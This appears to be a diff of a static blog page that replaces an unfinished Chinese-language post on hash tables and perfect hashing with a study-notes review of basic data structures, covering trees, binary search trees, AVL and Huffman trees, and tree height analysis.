@@ -306,7 +306,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/未命名文件夹/Hash 入门/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/Basic Data Structures/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lintao Fang">
@@ -325,7 +325,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/04/19/未命名文件夹/Hash 入门/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2018/04/23/Basic Data Structures/" itemprop="url">Basic Data Structures Review</a></h1>
         
 
         <div class="post-meta">
@@ -337,8 +337,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T20:43:00+08:00">
-                2018-04-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-23T17:24:44+08:00">
+                2018-04-23
               </time>
             
 
@@ -355,7 +355,7 @@
 
           
           
-             <span id="/2018/04/19/未命名文件夹/Hash 入门/" class="leancloud_visitors" data-flag-title="">
+             <span id="/2018/04/23/Basic Data Structures/" class="leancloud_visitors" data-flag-title="Basic Data Structures Review">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -388,103 +388,120 @@
       
         
           
-            <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>1.1 什么是哈希Hash 
-1.2 哈希函数 Hash Function 
-    1.2.1 哈希函数性质
-    1.2.2 哈希函数的选择
-    1.2.3 Perfect Hash Function (PHF) 
-    1.2.4 Minimal Perfect Hash Function (MPHF)  
-          [Note]
+            <pre><code>1 Tree
+    1.1 Definition
+    1.2 Operation 
+    1.3 性能分析 &amp; 计算相关问题
+    1.4 Implementation
+        1.4.1 二叉树的遍历
+        1.4.2 二叉搜索树的操作
+2 Linked List
 
-1.3 什么是哈希表 Hash Table
-    1.3.1 Key statistics 
-    1.3.2 Dynamic Resizing
-    1.3.3 ReHashing
-1.4 冲突 Collsion
-1.4 性能 
-1.5 哈希表的实现 Implementation 
-    1.5.1 PHF以及MPHF的实现
-    1.5.2 Java Python 实现
-1.6 应用 Applications 
-1.7 總結 Summary 
-1.7 References &amp; External Links
-</code></pre><h3 id="1-1-什么是哈希Hash？"><a href="#1-1-什么是哈希Hash？" class="headerlink" title="1.1 什么是哈希Hash？"></a>1.1 什么是哈希Hash？</h3><p>哈希表的实现 称之为 哈希，抑或 散列。(雜湊 For 台灣 )<br>哈希表在【平均】情况下以常数时间constant time 执行「插入」，「删除」和「查找」的技术。  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">为什么平均O(1)？原理？</div><div class="line">最坏情况下呢？ O(n) 为什么？</div></pre></td></tr></table></figure>
-<p>但是对于元素间的【排序】操作将不会得到有效的支持。<br>譬如FindMax,FindMin以及按序打印元素都是散列表所不支持的。<sup>[1]</sup></p>
-<p>哈希/散列 接收一个值，输出这个值的哈希值 </p>
-<p>维基百科<sup>[2]</sup>中有一段对其的介绍：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Selected From Wiki-Hash Table [2]: </div><div class="line">The idea of hashing is to distribute the entries (key/value pairs) across an </div><div class="line">array of buckets. Given a key, the algorithm computes an index that suggests </div><div class="line">where the entry can be found.</div></pre></td></tr></table></figure>
-<h3 id="1-2-哈希函数-Hash-Function-？"><a href="#1-2-哈希函数-Hash-Function-？" class="headerlink" title="1.2 哈希函数 Hash Function ？"></a>1.2 哈希函数 Hash Function ？</h3><p>哈希函数是可以将【任意大小】的数据映射为【固定】大小数据的一个函数。其返回数据的哈希值。<br>哈希函数的一个用处是用来实现哈希表Hash Table. 哈希表在计算机科学中被广泛应用以提高查询性能。<br>哈希函数在密码学，Cache , 布隆过滤器，等中也有所应用。<sup>[3]</sup></p>
-<p>关于具体的哈希函数，请参见<a href="https://en.wikipedia.org/wiki/List_of_hash_functions" target="_blank" rel="external">List of hash_functions</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">维基百科[3]：</div><div class="line">	A hash function is any function that can be used to map data of arbitrary size to data of fixed size. </div><div class="line">	The values returned by a hash function are called hash values, hash codes, digests, or simply hashes. </div><div class="line">	One use is a data structure called a hash table, widely used in computer software for rapid data lookup. </div><div class="line">	Hash functions accelerate table or database lookup by detecting duplicated records in a large file.</div></pre></td></tr></table></figure>
-<h3 id="1-2-1-哈希函数性质"><a href="#1-2-1-哈希函数性质" class="headerlink" title="1.2.1 哈希函数性质"></a>1.2.1 哈希函数性质</h3><p>一个好的哈希函数通常需要满足下列属性。当然，一个哈希函数要满足哪些性质，还要看具体的应用决定。<br>Determinism<br>Uniformity<br>Defined range<br>Variable range<br>Data normalization<br>Continuity<br>Non-invertible.  </p>
-<p>关于哈希函数的若干性质，参见<a href="https://en.wikipedia.org/wiki/Hash_function" target="_blank" rel="external">Hash Function 维基百科</a></p>
-<h3 id="1-2-2-哈希函数的选择"><a href="#1-2-2-哈希函数的选择" class="headerlink" title="1.2.2 哈希函数的选择"></a>1.2.2 哈希函数的选择</h3><p>存在着很多各种各样的哈希函数，这些函数都不尽相同。<br>对于特定的应用而言，如何选取合适的哈希函数是一个重要的问题。<br>函数的选择强烈依赖于输入数据的性质, 以及它们在预期应用程序中的概率分布。<sup>[3]</sup></p>
-<p>Trivial hash function 平凡哈希函数，<br>Perfect hashing 完美哈希，<br>Minimal perfect hashing，最小完美哈希，<br>Hashing uniformly distributed data 哈希均匀分布数据，<br>Universal hashing,Rolling hash …<br>等等。具体描述参见<a href="https://en.wikipedia.org/wiki/Hash_function" target="_blank" rel="external">Hash Function 维基百科</a>  </p>
-<p>下面对PHF,与MPHF作进一步学习。<br>当键值是【static(即固定不变)】的时候，我们可以涉及方案使得最差情况下的查询性能也很出色。<br>由此引入了  </p>
-<ul>
-<li>PHF  最坏时间O(1),  </li>
-<li>与MPHF 最坏时间O(1),空间O(n)。</li>
+3 Stack &amp; Queue
+
+
+4 Heap 
+5 String
+6 Hash
+</code></pre><p>今天，复习一下基本的数据结构。顺带解决一些小问题。</p>
+<pre><code>要解决的问题
+BST的定义？key可以相等吗? 
+Binary Search Tree 与最小堆之间的区别? 
+完全二叉树等的概念歧义问题？ 
+BST的平均高度？为什么？平均是什么意思？
+</code></pre><h3 id="1-Tree"><a href="#1-Tree" class="headerlink" title="1 Tree"></a>1 Tree</h3><h4 id="1-1-Definition"><a href="#1-1-Definition" class="headerlink" title="1.1 Definition"></a>1.1 Definition</h4><h4 id="1-1-1-Tree-树"><a href="#1-1-1-Tree-树" class="headerlink" title="1.1.1 Tree 树"></a>1.1.1 Tree 树</h4><p>在计算机科学中，树是一种被广泛使用的数据结构/ADT，树模仿自然界中树的层次结构。<br>关于树的确切定义，可以使用递归的方式来定义。<br>即：(Recursive Defintion)<br>树是一些节点的集合。<br>这个集合可以是空集。<br>若非空，则一棵树由一个称作根root的节点，以及0个或者多个非空的子树构成。<br>这些子树中的每一棵都与root有一条边链接。  </p>
+<p>图1：一棵树的实例：<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Binary_tree.svg/300px-Binary_tree.svg.png" alt=""></p>
+<h4 id="1-1-2-Binary-Tree-二叉树"><a href="#1-1-2-Binary-Tree-二叉树" class="headerlink" title="1.1.2 Binary Tree 二叉树"></a>1.1.2 Binary Tree 二叉树</h4><p>二叉树是一棵树，其中每个节点至多有两个儿子。</p>
+<h4 id="1-1-3-Binary-Search-Tree-二叉搜索树-BST"><a href="#1-1-3-Binary-Search-Tree-二叉搜索树-BST" class="headerlink" title="1.1.3 Binary Search Tree 二叉搜索树(BST)"></a>1.1.3 Binary Search Tree 二叉搜索树(BST)</h4><p>二叉搜索是特殊的二叉树。 每一个有节点有一个Key键值。<br>对于树中的每个节点X，它的左子树中的所有Key＜X.Key (≤X.Key).右子树中的所有Key＞X.Key(≥X.Key)。<br>(关于上述两种不同的定义情况，其本质问题即使BST是否允许存在两个节点Key相等？)<br>这个我在不同的书中看到了不同的定义<br>[1]中给出的定义是不可以相等。<br>[2]中给出的定义是可以。即树中的每个节点X,左子树中的所有Key≤X.Key.右子树中的所有Key≥X.Key.  </p>
+<pre><code>我个人认为：对于大部分情况而言，我们更倾向于不存在Key值相同的情况。这样即符合很多实际情况，又能够简化问题。 
+当然，也可以引入带有Key值相等的情况，这需要再实现上考虑这个问题。具体见[2]思考题12.1.
+（而且[2]的算法皆是按照在不存在key值相等的情况下编写的）  
+</code></pre><p>Binary Search Tree 与最小堆之间的区别：</p>
+<pre><code>二叉搜索树的节点的左右孩子是有序的，left.key &lt; parent.key &lt; right.key  
+而最小堆，其左右孩子是无序的，也没有大小关系。{left.key ,right.key}&gt; parent.key
+对于最小堆而言,查找最小值是O(1)的，由于其左右孩子无大小关系，其查找任意一key则是O(n)的。
+</code></pre><p>二叉搜索树与最优二叉搜索树：  </p>
+<pre><code>最优二叉搜索🌲 动态规划
+</code></pre><h4 id="1-1-4-其他Type的树"><a href="#1-1-4-其他Type的树" class="headerlink" title="1.1.4 其他Type的树"></a>1.1.4 其他Type的树</h4><h4 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h4><p>A perfect binary tree is a binary tree in which all interior nodes have two children and all leaves have the same depth or same level.<br><img src="http://images2015.cnblogs.com/blog/1094457/201702/1094457-20170225183610632-1388959691.png" alt=""></p>
+<h4 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h4><p>每个节点的度为0或2  。<br>A full binary tree (sometimes referred to as a proper or plane binary tree)is a tree in which every node has either 0 or 2 children.<br>图2： A full binary tree<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Full_binary.svg/220px-Full_binary.svg.png" alt=""></p>
+<h4 id="Complete-Binary-Tree"><a href="#Complete-Binary-Tree" class="headerlink" title="Complete Binary Tree"></a>Complete Binary Tree</h4><p>所有层全充满，除了最后一层。且最后一层的节点从左向右填充。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fqnt981a9ij30b606f0t4.jpg" alt=""><br>综上，即<br><img src="http://images2015.cnblogs.com/blog/1094457/201702/1094457-20170225184451991-1942362001.png" alt=""><br>上述定义来自维基百科，此为最为广泛使用的定义。<br>然后不同的文献之间定义却存在歧义。主要在于完全二叉树的问题上。  </p>
+<p>譬如说，<br>在一些国外教程以及国内教材中【完全二叉树】一词指上图中的complete binary tree，而在算法导论中【完全二叉树】一词指上图中perfect binary tree。用【近似的完全二叉树】一词表示上图中的complete binary tree。</p>
+<pre><code>国内教材中
+满二叉树 指 perfect binary tree
+完全二叉树 指 complete binary tree
+
+算法导论[2]中：
+满二叉树 指 perfect binary tree
+近似的完全二叉树 指 complete binary tree
+完全二叉树  指 perfect binary tree
+</code></pre><p>知乎上有一个讨论此问题的问题<a href="https://www.zhihu.com/question/19809666" target="_blank" rel="external">为什么说“满二叉树也是完全二叉树?</a> </p>
+<p>同样的，对于树的深度depth和高度height不同的作者也都有不用的定义。<br>见:<br><a href="https://stackoverflow.com/questions/2603692/what-is-the-difference-between-tree-depth-and-height" target="_blank" rel="external">What is the difference between tree depth and height?
+</a><br><a href="https://www.zhihu.com/question/40286584/answer/85888350" target="_blank" rel="external">link</a><br>另外，对于根节点的标记有的从0开始也有的从1开始。  </p>
+<p>先序序列为a,b,c,d 的不同二叉树的个数是<br>n个结点构成的不同二叉树个数为 c(n,2n)/(n+1) 【卡特兰数】</p>
+<h4 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h4><h4 id="why-AVL"><a href="#why-AVL" class="headerlink" title="why AVL?"></a>why AVL?</h4><p>对于BST而言，其查询插入删除的时间复杂度都是O(h),h为树的高度。  </p>
+<p>一个不好的消息是BST的最坏时间复杂是O(n)。即BST的高度最坏可以达到O(n)，这也不难理解。  试想一颗总是朝着一个方向生长的二叉树。 它的高度便是O(n)。<br>为了提高性能，我们的出发点便是控制树高。 使得树高不至于那么高(O(n)级别)。  </p>
+<p>为了能够控制树高，我们期望树更加平衡些。即左右子树高度相差不是很大。<br>譬如说，我们可以限制对于任意一个节点，其左右子树的高度相等。这样的话，树的高度就会受限，不会疯狂的朝着一个方向生长。  然而这样的条件比较苛刻。  不容易满足。<br>于是我们可以限制每一个节点左子树和右子树的高度最多差1。这样的话既可以控制树高，又不是那么难以满足。  </p>
+<h4 id="what"><a href="#what" class="headerlink" title="what ?"></a>what ?</h4><p>AVL树即平衡 二叉搜索树  其以发明者 Adelson-Velsky and Landis命名。  </p>
+<p>AVL 树 == BBST（Balanced Binary Search Tree）   </p>
+<p>一颗AVL树是其每一个节点左子树和右子树的高度最多差1的二叉搜索树。<br>AVL树是自平衡的，即使在插入删除操作中，它可以自己调整(Rotate)从而使得满足AVL树条件。</p>
+<p>AVL树的每一个结点都有一个平衡因子Balanced Factor:为该结点的左子树的深度减去它的右子树的深度。<br>对于AVL树而言对于任一节点N，有BalanceFactor(N) ∈ {–1,0,+1}  </p>
+<p>AVL树的深度和logN是同数量级的(其中的N为结点个数) （why?） </p>
+<h4 id="Huffman树"><a href="#Huffman树" class="headerlink" title="Huffman树"></a>Huffman树</h4><h4 id="如何构建"><a href="#如何构建" class="headerlink" title="如何构建?"></a>如何构建?</h4><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>树中一定没有度为1的结点</p>
+<h4 id="ASL"><a href="#ASL" class="headerlink" title="ASL"></a>ASL</h4><pre><code>huffman树与最优二叉搜索树的区别
+</code></pre><h4 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h4><p>前序和后序线索化之后，空链域为1<br>中序线索化后，空链域为2</p>
+<p>n个结点的线索二叉树上含有的线索数为 2n - (n-1) = n+1</p>
+<h4 id="1-1-5-高级树结构"><a href="#1-1-5-高级树结构" class="headerlink" title="1.1.5 高级树结构"></a>1.1.5 高级树结构</h4><h4 id="B-树"><a href="#B-树" class="headerlink" title="B 树"></a>B 树</h4><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><h4 id="基数树"><a href="#基数树" class="headerlink" title="基数树"></a>基数树</h4><h4 id="Treap树"><a href="#Treap树" class="headerlink" title="Treap树"></a>Treap树</h4><h4 id="1-2-Operation-操作"><a href="#1-2-Operation-操作" class="headerlink" title="1.2 Operation 操作"></a>1.2 Operation 操作</h4><ul>
+<li>二叉树<ul>
+<li>遍历  （前序/中序/后序/层次）</li>
 </ul>
-<h4 id="1-2-3-Perfect-Hash-Function-PHF"><a href="#1-2-3-Perfect-Hash-Function-PHF" class="headerlink" title="1.2.3 Perfect Hash Function (PHF)?"></a>1.2.3 Perfect Hash Function (PHF)?</h4><p>即【沒有冲突】的哈希函数<sup>[2]</sup> no collisions<br>即：<sup>[5]</sup>  </p>
-<pre><code>函数 Hash 将 N 个 Key 值映射到 M 个整数上，这里 M&gt;=N 
-    对于任意的 Key1 ，Key2 ，
-     Hash( Key1 ) != Hash( Key2 )   
-</code></pre><p>如何construct?    见[4]  </p>
-<p>拓展：</p>
-<ul>
-<li><a href="https://en.wikipedia.org/wiki/Dynamic_perfect_hashing" target="_blank" rel="external">Dynamic perfect hashing</a>  【动态完美哈希函数】</li>
-<li>Minimal perfect hash function   【最小完美哈希函数 】</li>
-<li>Order preservation   【保序最小完美哈希函数】<ul>
-<li>key<sub> I </sub> &lt; key<sub> J </sub> 等价于 Hash(key<sub> I </sub>) &lt; Hash(key<sub> J </sub>)</li>
-<li>满足 Minimal perfect hash function</li>
+</li>
+<li>二叉搜索树BST<ul>
+<li>插入/删除</li>
+<li>搜索    </li>
 </ul>
 </li>
 </ul>
-<h4 id="1-2-4-Minimal-Perfect-Hash-Function-MPHF"><a href="#1-2-4-Minimal-Perfect-Hash-Function-MPHF" class="headerlink" title="1.2.4 Minimal Perfect Hash Function (MPHF)?"></a>1.2.4 Minimal Perfect Hash Function (MPHF)?</h4><p>在1.2.3 Perfect Hash Function (PHF)中，若M==N,则为MPHF.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">维基百科[4]:</div><div class="line">A minimal perfect hash function is a perfect hash function that maps n keys to n</div><div class="line">consecutive integers – usually the numbers from 0 to n − 1 or from 1 to n</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">NOTE:</div><div class="line">静态</div><div class="line">[5]</div><div class="line">通常情况下，PHF或MPHF是针对静态集合的。也就是，在使用PHF或MPHF时，</div><div class="line">所有的 KEY 值是事先已知并且固定的。</div><div class="line">不过，这里有针对动态集合的一个算法（我没有仔细看，不敢肯定）</div><div class="line"></div><div class="line">[6]</div><div class="line">缺点：</div><div class="line">一是必须事前必须知道原数据集，二是需要花一定的CPU来生成这个函数。</div><div class="line">我认为，对于数据仓库类的线下搜索应用，这个算法是有用武之地的。</div><div class="line">但对于强调实时的数据业务，这个算法是不适合的。</div></pre></td></tr></table></figure>
-<h3 id="1-3-什么是哈希表-7"><a href="#1-3-什么是哈希表-7" class="headerlink" title="1.3 什么是哈希表[7] ?"></a>1.3 什么是哈希表<sup>[7]</sup> ?</h3><p>哈希表是一种基于键-值(key-index) 的数据结构。<br>哈希表通过哈希函数实现key , index的转换。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[7]</div><div class="line">Selected From Wiki-Hash Table : </div><div class="line">	In computing, a hash table (hash map) is a data structure which implements an </div><div class="line">associative array abstract data type, a structure that can map keys to values. A </div><div class="line">hash table uses a hash function to compute an index into an array of buckets or</div><div class="line">slots, from which the desired value can be found.</div></pre></td></tr></table></figure>
-<p>在很多情况下，哈希表在平均性能上【优于】 搜索树以及 table lookup structure。<br>因此哈希表在计算机领域中得到广泛应用，尤其是涉及数组，数据库索引，Cache和Set.   </p>
-<h4 id="1-3-1-Key-statistics"><a href="#1-3-1-Key-statistics" class="headerlink" title="1.3.1 Key statistics"></a>1.3.1 Key statistics</h4><ul>
-<li><p>load factor = n/k </p>
+<p>Note:  </p>
+<pre><code>对于所有遍历操作，不论是递归实现还是迭代实现，其时间复杂度都是O(n)。  (why?)
+</code></pre><h4 id="1-3-性能分析-amp-计算相关问题"><a href="#1-3-性能分析-amp-计算相关问题" class="headerlink" title="1.3 性能分析 &amp; 计算相关问题"></a>1.3 性能分析 &amp; 计算相关问题</h4><h4 id="1-3-1-二叉树Binary-Tree"><a href="#1-3-1-二叉树Binary-Tree" class="headerlink" title="1.3.1 二叉树Binary Tree"></a>1.3.1 二叉树Binary Tree</h4><p>对于遍历操作，不论是递归实现还是迭代实现，其时间复杂度都是O(n)。</p>
+<h4 id="1-3-2-二叉搜索树Binary-Search-Tree"><a href="#1-3-2-二叉搜索树Binary-Search-Tree" class="headerlink" title="1.3.2 二叉搜索树Binary Search Tree:"></a>1.3.2 二叉搜索树Binary Search Tree:</h4><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqmrwdyw0nj308204gmxb.jpg" alt="">[3]</p>
+<p>对于插入，删除，查找操作其复杂度都是O(h) ，这是显而易见的。<br>接下来的问题便是h到底是多少，h与n的关系了.<br>对于树的深度而言，其</p>
 <ul>
-<li>n is the number of entries</li>
-<li>k is the number of slots</li>
-</ul>
-<p>load factor 过大，冲突可能性增加；<br>load factor 过小，空间的浪费。  </p>
-</li>
-</ul>
-<h4 id="1-3-2-Dynamic-Resizing"><a href="#1-3-2-Dynamic-Resizing" class="headerlink" title="1.3.2 Dynamic Resizing"></a>1.3.2 Dynamic Resizing</h4><p>动态调整大小  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">For example, in Java&apos;s HashMap class the default load factor threshold for</div><div class="line">table expansion is 3/4 and in Python&apos;s dict, table size is resized when load </div><div class="line">factor is greater than 2/3</div></pre></td></tr></table></figure>
-<h4 id="1-3-3-Rehashing"><a href="#1-3-3-Rehashing" class="headerlink" title="1.3.3 Rehashing"></a>1.3.3 Rehashing</h4><p> O(n) </p>
-<h3 id="1-4-冲突"><a href="#1-4-冲突" class="headerlink" title="1.4 冲突"></a>1.4 冲突</h3><h4 id="冲突问题"><a href="#冲突问题" class="headerlink" title="冲突问题"></a>冲突问题</h4><p>优于哈希函数不一定是完美哈希函数或者是slots过少，因此可能会导致冲突发生，产生冲突可以有多重方法加以解决。</p>
-<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
-<li>分离链接法    </li>
-<li>开放定址法<ul>
-<li>线性探测</li>
-<li>平凡探测</li>
+<li>最坏深度为O(n) ，这是显而易见的。  </li>
+<li>平均深度 O(log n)  这导出两个问题，<ul>
+<li>1.为什么是O(log n)? 如何证明之</li>
+<li>2.在这里平均的意义(含义)又是什么？</li>
 </ul>
 </li>
-<li>Rehash </li>
 </ul>
-<h3 id="1-4-性能"><a href="#1-4-性能" class="headerlink" title="1.4 性能"></a>1.4 性能</h3><p>[7]<br>In the simplest model, the hash function is completely unspecified and the table does not resize. For the best possible choice of hash function, a table of size k with open addressing has no collisions and holds up to k elements, with a single comparison for successful lookup, and a table of size k with chaining and n keys has the minimum max(0, n − k) collisions and O(1 + n/k) comparisons for lookup. For the worst choice of hash function, every insertion causes a collision, and hash tables degenerate to linear search, with Ω(n) amortized comparisons per insertion and up to n comparisons for a successful lookup.</p>
-<p>Adding rehashing to this model is straightforward. As in a dynamic array, geometric resizing by a factor of b implies that only n/bi keys are inserted i or more times, so that the total number of insertions is bounded above by bn/(b − 1), which is O(n). By using rehashing to maintain n &lt; k, tables using both chaining and open addressing can have unlimited elements and perform successful lookup in a single comparison for the best choice of hash function.</p>
-<p>In more realistic models, the hash function is a random variable over a probability distribution of hash functions, and performance is computed on average over the choice of hash function. When this distribution is uniform, the assumption is called “simple uniform hashing” and it can be shown that hashing with chaining requires Θ(1 + n/k) comparisons on average for an unsuccessful lookup, and hashing with open addressing requires Θ(1/(1 − n/k)).[25] Both these bounds are constant, if we maintain n/k &lt; c using table resizing, where c is a fixed constant less than 1.</p>
-<h3 id="1-5-Implementation-实现"><a href="#1-5-Implementation-实现" class="headerlink" title="1.5 Implementation 实现"></a>1.5 Implementation 实现</h3><h4 id="1-5-1-PHF以及MPHF的实现"><a href="#1-5-1-PHF以及MPHF的实现" class="headerlink" title="1.5.1 PHF以及MPHF的实现"></a>1.5.1 PHF以及MPHF的实现</h4><p>关于PHF以及MPHF的实现，这位<a href="https://blog.csdn.net/chixinmuzi" target="_blank" rel="external">博主</a>已经给了较好的总结，<br>我不认为我可以比他总结的更好。于是就照搬过来吧。<br>参见 ：<br><a href="https://blog.csdn.net/chixinmuzi/article/details/1727195" target="_blank" rel="external">完美哈希函数（Perfect Hash Function）</a> 的【PHF和MPHF生成程序库】以及【PHF和MPHF生成算法】部分。</p>
-<h4 id="1-5-2-Java-Python-实现"><a href="#1-5-2-Java-Python-实现" class="headerlink" title="1.5.2 Java Python 实现"></a>1.5.2 Java Python 实现</h4><p>待续</p>
-<h3 id="1-6-应用-Applications"><a href="#1-6-应用-Applications" class="headerlink" title="1.6 应用 Applications"></a>1.6 应用 Applications</h3><p>待续</p>
-<h3 id="1-7-總結-Summary"><a href="#1-7-總結-Summary" class="headerlink" title="1.7 總結 Summary"></a>1.7 總結 Summary</h3><p>哈希表作为常数平均时间查询与插入的数据结构。采用哈希函数实现。<br>哈希函数常常是不完美的因此会产生冲突问题，对此也有一系列的解决方法。<br>哈希表也可以动态调整。<br>完美哈希函数在一些库中已经得到了较好的实现。哈希表在Java等编程语言中也得到了实现。<br>哈希表作为一个优秀的数据结构在计算机科学的很多领域都发挥着重要的作用。</p>
-<h3 id="1-8-References-amp-External-Links"><a href="#1-8-References-amp-External-Links" class="headerlink" title="1.8  References &amp; External Links"></a>1.8  References &amp; External Links</h3><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p>[1] 数据结构与算法-C语言描述[Mark Allen Weiss]         Chapter 5  </p>
-<p>[2] <a href="https://en.wikipedia.org/wiki/Hash_table" target="_blank" rel="external">Hash Table维基百科</a></p>
-<p>[3] <a href="https://en.wikipedia.org/wiki/Hash_function" target="_blank" rel="external">Hash Function 维基百科</a></p>
-<p>[4] <a href="https://en.wikipedia.org/wiki/Perfect_hash_function" target="_blank" rel="external">Perfect Hash Function维基百科</a> </p>
-<p>[5] <a href="https://blog.csdn.net/chixinmuzi/article/details/1727195" target="_blank" rel="external">完美哈希函数（Perfect Hash Function）- Blog</a></p>
-<p>[6] <a href="http://www.yankay.com/introduction-to-opmphf/" target="_blank" rel="external">最小完美哈希函数简介-Blog</a></p>
-<p>[7] <a href="https://en.wikipedia.org/wiki/Hash_table" target="_blank" rel="external">Hash_table维基百科</a></p>
-<h4 id="External-Links"><a href="#External-Links" class="headerlink" title="External Links"></a>External Links</h4><p><a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">Distributed hash table</a></p>
-<p><a href="http://tools.timodenk.com/?p=hash-function" target="_blank" rel="external">Calculate hash of a given value </a>by Timo Denk</p>
+<p>关于问题1，我在[1],[2]中找到了相关的说明。  </p>
+<p><strong>[2]</strong> 中定理12.4 证明了<br>一颗有n个不同关键字的随机构建二叉搜索树的期望高度是O(log n )   </p>
+<pre><code>NOTE:
+在这里随机构建的含义即是，考虑n个不同的节点，其所有排列情况是n!中，对于每一种情形按次序依次插入一个元素构建BST，
+注意只有插入操作，而没有删除操作。这样的构建过程叫做随机构建。 
+
+12.4节中同样证明了，一颗有n个不同关键字的随机构建二叉搜索树的期望高度是O(log n ) 。
+但是对于既存在插入操作，又存在删除操作的BST，其平均深度在[2]中并未做说明。  
+If deletions are allowed as well as insertions, 
+&quot;little is known about the average height of a binary search tree&quot;
+</code></pre><p><strong>[1]</strong> 中证明了，有n个节点，假设所有的树出现的机会相等时，则树平均深度为O(log n)<br>证明过程见下<a href="https://ws2.sinaimg.cn/large/006tKfTcly1fqnqnhzcpij30qd0h779p.jpg" target="_blank" rel="external">Weisss-p78</a><br>在这里，我认为其含义同[2]，即随机构建，虽然[1]中貌似并未明确其平均含义。  </p>
+<pre><code>对于既存在插入操作，又存在删除操作的情况下，
+[1]中给出了如下结论：
+已经证明，如果我们交替插入和删除θ(n^2)次，那么树的期望深度是θ(根号n)
+</code></pre><h4 id="1-3-3-相关计算"><a href="#1-3-3-相关计算" class="headerlink" title="1.3.3 相关计算"></a>1.3.3 相关计算</h4><p>设层数从1开始，即根节点为第1层，共有k层。  </p>
+<ul>
+<li>那么第i层，最多有2^(i-1)个节点。  </li>
+<li><p>整棵树，最多有2^0 + 2^1 +  … 2^(k-1) = 2^k -1   </p>
+</li>
+<li><p>若叶子节点即读书为0的节点有m个，度数为2的节点有n个，那么 m = n + 1</p>
+</li>
+<li>若整棵树有N个节点，设其高度为h。那么有[2^(h-1)-1] + 1 ≤ N ≤ 2^h - 1 即floor(log2(N)) + 1 后者ceil(log2(N+1))</li>
+</ul>
+<h4 id="1-4-Implementation-实现"><a href="#1-4-Implementation-实现" class="headerlink" title="1.4 Implementation  实现"></a>1.4 Implementation  实现</h4><h4 id="1-4-1-Tree-遍历"><a href="#1-4-1-Tree-遍历" class="headerlink" title="1.4.1 Tree 遍历"></a>1.4.1 Tree 遍历</h4><h4 id="1-4-2-二叉搜索树的操作"><a href="#1-4-2-二叉搜索树的操作" class="headerlink" title="1.4.2 二叉搜索树的操作"></a>1.4.2 二叉搜索树的操作</h4><h4 id="二叉树的重构"><a href="#二叉树的重构" class="headerlink" title="二叉树的重构"></a>二叉树的重构</h4><p>所谓重构即使，在不知道二叉树结构的情况下，从二叉树的先序中序后序遍历序列中重构出二叉树的结构。<br>可以证明：<br>采用 (先序遍历 || 后序遍历) + 中序遍历 可以重构出二叉树。<br>采用 先序遍历 + 中序遍历 不可以重构出二叉树   </p>
+<p>至于为什么？相关证明参见<a href="http://www.xuetangx.com/courses/course-v1:TsinghuaX+30240184X+sp/courseware/16d8402a24fd4429a8a7cc1c8401cb1f/b3fdcad4c3a84a8a861003eaa8b5965c/" target="_blank" rel="external">数据结构-二叉树重构</a></p>
+<h5 id="那么如何重构？"><a href="#那么如何重构？" class="headerlink" title="那么如何重构？"></a>那么如何重构？</h5><p>[1]: 数据结构与算法分析 C语言描述 Weiss</p>
+<p>[2]: 算法导论 CLRS 3th Edition</p>
+<p>[3] <a href="https://en.wikipedia.org/wiki/Binary_search_tree" target="_blank" rel="external">https://en.wikipedia.org/wiki/Binary_search_tree</a></p>
 
           
         
@@ -533,7 +550,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/13/未命名文件夹/SQL-injection/">
